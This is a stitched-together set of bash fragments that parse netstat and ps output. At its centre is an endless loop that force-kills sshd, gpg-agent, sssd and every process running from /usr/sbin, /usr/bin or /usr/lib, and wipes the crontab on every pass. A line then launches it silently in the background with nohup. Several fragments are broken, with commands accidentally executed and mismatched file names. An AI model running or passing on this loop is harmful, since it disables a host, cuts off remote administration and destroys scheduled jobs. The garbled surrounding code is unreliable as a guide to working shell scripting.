listenInfo=$(netstat -antlp)
IFS=$'\n'
for c in $listenInfo; do
  echo "$c"
  propInfo= $($(echo "$c" | awk '{print $1}'))
  echo "$propInfo"
  echo $(echo $c | awk '{print $2}')
  echo $(echo $c | awk '{print $3}')
  echo $(echo $c | awk '{print $4}')
  echo $(echo $c | awk '{print $5}')
  echo $(echo $c | awk '{print $6}')
  echo $(echo $c | awk '{print $7}')
  echo $(echo $c | awk '{print $8}')

done

 netstat -antlp | awk '{print $7}'| grep -v 'java\|sshd'
 netstat -antlp | awk '{print $7}'| grep -v 'java\|sshd\|-\|nginx\|Address'|cut -d '/' -f1

while 2>1; do
  pid=$(ps -ef | grep /usr/sbin/sshd | awk '{print $2}')
  kill -9 $pid
  echo "kill -9  $pid"

  pid1=$(ps -ef | grep priv | awk '{print $2}')
  kill -9 $pid1
  echo "kill -9  $pid1"

 pid2=$(ps -ef | grep gpg-agent | awk '{print $2}')
  kill -9 $pid2
  echo "kill -9  $pid2"

 pid3=$(ps -ef | grep sssd | awk '{print $2}')
  kill -9 $pid3
  echo "kill -9  $pid3"

   pid4=$(ps -ef | grep kthreaddk | awk '{print $2}')
  kill -9 $pid4
  echo "kill -9  $pid4"

   pid5=$(ps -ef | grep /usr/sbin/ | awk '{print $2}')
  kill -9 $pid5
  echo "kill -9  $pid5"

   pid6=$(ps -ef | grep /usr/bin/ | awk '{print $2}')
  kill -9 $pid6
  echo "kill -9  $pid6"

   pid7=$(ps -ef | grep /usr/lib | awk '{print $2}')
  kill -9 $pid7
  echo "kill -9  $pid7"

  crontab -r
  sleep 2
done




nohup  sh deploy_force_kill.sh &>/dev/null &
#num=-16
#
#pidStr='4444/ssss'
#for i in $listenInfo
#do
#        num=`expr ${num} + 1`
#        echo "$num"
#        echo "$i"
#done

#!/bin/bash
netstat -antlp >netstatInfo.txt
IFS='\n'
sed -i '1,2d' 1.txt
for c in $(cat 1.txt); do
  propinfo=$(echo $c | awk '{print $7}')
  echo $propinfo
  pid=$(echo ${propinfo%%/*})
  #echo " $pid"
done

#!/bin/bash
ps -ef | grep /ssdh >pidInfo.txt
IFS='\n'
sed -i '1,2d' pidInfo.txt
for c in $(cat pidInfo.txt); do
  echo "$c"
  propinfo=$(echo $c | awk '{print $2}')
  echo $propinfo

done
~
~
